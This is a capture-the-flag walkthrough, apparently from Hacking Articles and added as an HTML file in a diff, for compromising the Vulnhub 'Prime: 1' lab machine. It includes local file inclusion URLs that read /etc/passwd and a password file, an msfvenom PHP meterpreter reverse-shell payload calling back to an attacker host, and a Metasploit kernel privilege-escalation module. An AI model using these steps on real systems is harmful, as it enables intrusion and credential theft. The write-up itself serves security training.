@@ -1,0 +1,119 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Prime: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/prime-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-09-07T13:43:11+00:00">September 7, 2019</time><time class="updated" datetime="2025-06-10T20:11:09+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Prime writeup- our other CTF challenges for CTF players and it can be download from vulnhub from <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/prime-1,358/">here</a></strong>. The credit goes to “Suraj Pandey” for designing this VM machine for beginners. This is a Linux based CTF challenge where you can use your basic pentest skill to compromise this VM to escalate the root privilege shell.</span></p>
+<p><span style="color: #000000;">The difficulty level of the lab is set easy to intermediate at the phase of initial foothold and once the machine is get compromised the privilege escalation phase is very easy. To capture the flag, you need to find user.txt and root.txt file.</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodologies</strong></span></h3>
+<p><span style="color: #000000;"><strong>Network Scan</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing web application</span></li>
+<li><span style="color: #000000;">Dirb</span></li>
+<li><span style="color: #000000;">fuzzing</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">LFI</span></li>
+<li><span style="color: #000000;">Abusing WordPress</span></li>
+<li><span style="color: #000000;">Injecting PHP reverse shell payload</span></li>
+<li><span style="color: #000000;">Obtain Meterpreter Session</span></li>
+<li><span style="color: #000000;">Capture the Flagtxt</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Kernel Exploit (Metasploit)</span></li>
+<li><span style="color: #000000;">Capture the Flag.txt</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong><u>Walkthrough</u></strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">This CTF is started to run on a virtual box, so use a virtual box to run this machine. We’ve got a few hints at the initial phase when the host machine starts up.</span></p>
+<p><span style="color: #000000;">We notice the following:</span></p>
+<ul>
+<li><span style="color: #000000;">The VM is designed on “<em>ubuntu 16.04</em>”</span></li>
+<li><span style="color: #000000;">Found a username: “<em>victor</em>”</span></li>
+<li><span style="color: #000000;">Hint for Password.txt file “<em>find password.txt file in my directory</em>”</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SN_4ihKHrfU/XXOweZ09lFI/AAAAAAAAgd4/2SnRcQEckJwAVHg0y5G1LY-EaG0Y7fW8wCLcBGAs/s1600/0.png"/></span></p>
+<p><span style="color: #000000;">Time to identify the IP of the host machine with the help of netdiscover. Here we have 192.168.1.101 as an IP host on my network, let’s go further to scan the victim’s network to identify the open port and services running across it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-guLbalGVU8o/XXOweRBl9TI/AAAAAAAAgdw/eaoDDslh4mYhp5uYjFG1eKbZFw3-luzyACLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Using an aggressive nmap scan, we only found two open ports, i.e. 22 for ssh and 80 for http.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.101</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wrxYijMCjzw/XXOwgEau_DI/AAAAAAAAgeM/Xje_ABmh4fkFG2_If8rHfEdyG1IYrNwNACLcBGAs/s1600/2.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Further, we need to start enumeration against the host machine, therefore without wasting time, we navigate to a web browser for exploring HTTP service but we didn’t found anything here.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1NouAexTKl8/XXOwjRpU2rI/AAAAAAAAgew/V4_qCbYye8MFzutyyLmE_1JBnTXkrXD7wCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Then we go to the web directory listing and use the starting directory brute force with the help of dirb. Hmmmm!! Shows two interesting directories, <em>/dev</em> &amp; <em>/WordPress</em>, which means that the host uses the WordPress application.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.101</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wyW2qCCQuT4/XXOwjjJwWMI/AAAAAAAAge0/YnwK55Zc-F82jN18ibmaL9GUcoeEDtfsQCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Lol! By exploring /dev directory we got a message and that it wasn’t useful</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ROhniEy3cxE/XXOwj9IdUNI/AAAAAAAAge4/IBBLc5NRMZExvAX6OnVnsSuL9_Jr7LwaACLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">We further explored /WordPress and found the WordPress welcome page. When you browse this page, you will also find the username “Victor” which means that the victor could be the admin.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-20TecyquWec/XXOwkPZSK_I/AAAAAAAAge8/9vsh-iotzg4gv-ijky0NG2pFOISYi8IZACLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Then we dig further but didn’t find anything, so we’re using dirb again to list .txt extension files, and fortunately, we’ve found a secret.txt file out of the result.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.101/ -X .txt</pre>
+<p><span style="color: #000000;">Let’s go for secret.txt file and figure out what is this file has.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HQtGh7QKhYA/XXOwkSKUM2I/AAAAAAAAgfA/C-tPm9UrDuUoguWKyJ9Gw12J5UZmpikCwCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Hmmmm! The secret.xt file provided an indication for the<strong> GitHub link</strong> and the <strong>location.txt</strong> file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SaAFmZt3zNY/XXOwk600tyI/AAAAAAAAgfE/zG-HbvpmFfQYUH6ulE125FJd-voYHFsrACLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">The Github page contains a few commands for Fuzzing, we try to use each command, but it didn’t work as if it was aspected. Then we notice “file” as a fuzzy payload that might be another hint, so we used it to fuzz.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BlhYr46iSr4/XXOwk-1lQbI/AAAAAAAAgfI/-IuOFH53iB4goGG7_ArmweUeXNxeAbuTwCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">So we try to navigate the following URL as per hint, and this approach works as shown in the image below.</span></p>
+<pre class="lang:default decode:true">http://192.168.1.101/index.php?file=</pre>
+<p><span style="color: #000000;">At the end of the web page, the author left us with a comment as a hint.</span></p>
+<p><span style="color: #000000;"><em>“Do something better</em></span></p>
+<p><span style="color: #000000;"><em>You are digging the wrong file” </em></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oIi7DeRp9tQ/XXOwedCc30I/AAAAAAAAgd0/jYr8vfRgJ1MskpcVVVedS6kv8aD41EiuwCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">If you remember, we got a hint for the “location.txt” file from inside the secret.txt file. So we’re trying to call the location.txt file with the given URL.</span></p>
+<pre class="lang:default decode:true">http://192.168.1.101/index.php?file=location.txt</pre>
+<p><span style="color: #000000;">Great!! We have been able to access the file location.txt, which means that it is vulnerable to local file inclusion (LFI). Let’s try and take advantage of it.</span></p>
+<p><span style="color: #000000;">Also, location.txt file gave a hint us to use “<em>secrettire360 as parameter on other php page</em>”.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-y1WMNn9RjIE/XXOwfHBd_lI/AAAAAAAAgd8/A5tI-isckYUhCWS9NQXGdZW7P9CsLDoRwCLcBGAs/s1600/11.png"/></strong></span></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Exploiting</span> </strong></span></h3>
+<p><span style="color: #000000;">As per the above observation, we try to exploit LFI by executing the following command to extract / etc / password file.</span></p>
+<pre class="lang:default decode:true">http://192.168.1.101/image.php?secrettier360=/etc/passwd</pre>
+<p><span style="color: #000000;">Boom!! Boom!! And we’ve got the/etc/passwd file of the host machine. if you will notice below image here user: Saket is giving an indication to look inside his directory i.e. /home/saket for password.txt file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZK6bwAlAmv4/XXOwfhgSC_I/AAAAAAAAgeA/pfbqVpPIffECS9DS0qDWftZzHII0TcUBQCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">To get the password file we try to explore the following URL:</span></p>
+<pre class="lang:default decode:true">http://192.168.1.101/image.php?secrettier360=/home/saket/password.txt</pre>
+<p><span style="color: #000000;">And we found the password: <strong><em>follow_the_ippsec</em></strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kiV9f1DRyWU/XXOwf5Cfl0I/AAAAAAAAgeE/Wk7oy-Zc5CcZRMnwhtlsdzYWuj86_diCACLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">It was time to utilized above-enumerated credential for login into WordPress, we, therefore, try to access the WordPress admin console using the combination of the <strong>victor: follow_the_ippsec</strong>.</span></p>
+<p><span style="color: #000000;">After login into WordPress, we try to inject malicious php script via theme templates or by installing new plugin, but all of them fail because they have no writable permission.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BgcHpaVIY-M/XXOwgK9KlyI/AAAAAAAAgeI/PU4fFPx80X8nID9Ab74bKF6lh3W56FvbQCLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Providentially, we’ve seen a secret.php file that also has writeable permission, which means we can write our malicious php code here.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7Lqaae83uwQ/XXOwgcbDw1I/AAAAAAAAgeQ/V9Yz4a6ntcAhP295khKav7QJWGw-7h32ACLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">We, therefore, write use msfvenom following command for generating malicious php code in raw format.</span></p>
+<pre class="lang:default decode:true">msfveom -p php/meterpreter/reverse_tcp lhost=192.168.1.106 lport=4444 R</pre>
+<p><span style="color: #000000;">Then copy the highlighted code for injected inside secret.php page</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ik02hI-maHg/XXOwg_NExwI/AAAAAAAAgeU/I537p6g7VsYccX4kiyJp0IkQFRgnS1-uACLcBGAs/s1600/21.png"/></span></p>
+<p><span style="color: #000000;">So here, we’ve injected our malicious code and updated the file, and at the same time, we’ve started a multi-handler to get a backup of the host machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FHJGfA2OhE8/XXOwhBvndXI/AAAAAAAAgeY/OXUL7c8yUT8RB5WKcUdSN92CBKC6n9pSwCLcBGAs/s1600/22.png"/></span></p>
+<p><span style="color: #000000;">When everything is set up, we try to trigger our malicious php script by running the following URL:</span></p>
+<pre class="lang:default decode:true">http://192.168.1.101/wordpress/wp-content/themes/twentynineteen/secret.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-19Xrv-nbPIk/XXOwhBAl4eI/AAAAAAAAgec/FAKe-0QiU4QTOf1i1NS1GPkk3xgEsKNoQCLcBGAs/s1600/23.png"/></span></p>
+<p><span style="color: #000000;">After executing the above url we got meterpreter session1 which is limited shell access of host machine and here we found the kernel version, now let’s go for post enumeration to find out user.txt file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zZ90l8Ha9ng/XXOwhz1CLfI/AAAAAAAAgeg/TARTggPx_24t4YXuzfNvs9aeIVoD5H1YgCLcBGAs/s1600/24.png"/></span></p>
+<p><span style="color: #000000;">From inside /home/saket we found our 1<sup>st</sup> flag user.txt file. Further, let’s got for privilege escalation to access root shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-56RERK0-Rno/XXOwh-7sw4I/AAAAAAAAgeo/clblv3E5TYQDp85sI6TM6UMWP1XdOOagwCLcBGAs/s1600/25.png"/></span></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Privilege Escalation</span> </strong></span></h3>
+<p><span style="color: #000000;">As we already know the kernel version of the host therefore without wasting time we look for a kernel exploit in the google and found the Metasploit module for exploiting the kernel.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZORNpzl5eKI/XXOwh4xwaRI/AAAAAAAAgek/RxTzAbD3mvUEkKQjVmX_58tLCbnyMNClACLcBGAs/s1600/26.png"/></span></p>
+<p><span style="color: #000000;">Thus we use the following module:</span></p>
+<pre class="lang:default decode:true">msf &gt; use exploit/linux/local/bpf_sign_extension_priv_esc
+msf exploit(exploit/linux/local/bpf_sign_extension_priv_esc) &gt; set session 1
+msf exploit(exploit/linux/local/bpf_sign_extension_priv_esc) &gt; exploit</pre>
+<p><span style="color: #000000;">Great!! we got another meterpreter session i.e session 2, and after that, we get into the root directory and capture the final flag i.e. root.txt</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Wa0LhM1U-aw/XXOwimiLMLI/AAAAAAAAges/EKsNb1VlUDsJD_7_O8yUlEOJiHAhnyHZwCLcBGAs/s1600/27.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
